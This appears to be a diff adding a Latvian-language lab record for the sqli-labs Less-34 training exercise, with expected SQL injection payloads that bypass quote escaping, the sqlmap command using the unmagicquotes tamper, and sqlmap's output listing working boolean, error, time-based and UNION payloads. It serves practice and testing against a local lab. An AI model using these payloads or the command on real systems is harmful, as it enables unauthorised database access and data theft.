@@ -1,0 +1,57 @@
+=================================================================================
+1. Īpašība: pirms bīstamiem simboliem (šajā gadījumā pirms pēdiņām) ir filtrs, kas ievieto "\", get atšķirībā no sqli-labs32 šeit jātiek galā ar POST parametru, kļūdas gadījumā ziņojums NEparādās rezultāta tajā pašā vietā
+2. Nepiciešams tampering: jā, --tamper=unmagicquotes
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: uname=�' or 1=1#&passwd=test
+3.2. error-based: uname=�'
+3.3. time-based: uname=�' or sleep(1)#&passwd=test
+3.4. union: uname=�' union select 1,2#&passwd=test
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 5460714 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://localhost/sqli-labs/sqli-labs/Less-34/" -p uname,passwd --data="uname=test&passwd=test" -risk=3 --level=5 --tamper=unmagicquotes
+
+7. Jautājumi, kurus uzdeva SQLMap:
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+7.3. POST parameter 'passwd' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+7.4. there were multiple injection points, please select the one to use for following injections: 0 (0 nozīmē = parameter: username)
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 293 HTTP(s) requests:
+---
+Parameter: passwd (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: uname=test&passwd=-2303' OR 4105=4105-- urpc
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: uname=test&passwd=test' AND GTID_SUBSET(CONCAT(0x716b786b71,(SELECT (ELT(3929=3929,1))),0x71767a7671),3929)-- VjUf
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=test&passwd=test' AND (SELECT 8093 FROM (SELECT(SLEEP(5)))oysY)-- sWpt
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: uname=test&passwd=test' UNION ALL SELECT CONCAT(0x716b786b71,0x4651736e546e43417657784374784a52425866456b49716c79666868424a5a4459756b74556a7747,0x71767a7671),NULL-- -
+
+Parameter: uname (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: uname=-8618' OR 2563=2563-- krXy&passwd=test
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: uname=test' AND GTID_SUBSET(CONCAT(0x716b786b71,(SELECT (ELT(3566=3566,1))),0x71767a7671),3566)-- BRWE&passwd=test
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=test' AND (SELECT 6001 FROM (SELECT(SLEEP(5)))VIZl)-- RuQu&passwd=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: uname=test' UNION ALL SELECT NULL,CONCAT(0x716b786b71,0x564f694758454d4a75715448787a5055665658634755505a755a6b7042684e66764c79464a70686a,0x71767a7671)-- -&passwd=test
+---
+web application technology: PHP 5.6.40, Apache 2.4.38
+back-end DBMS: MySQL >= 5.6
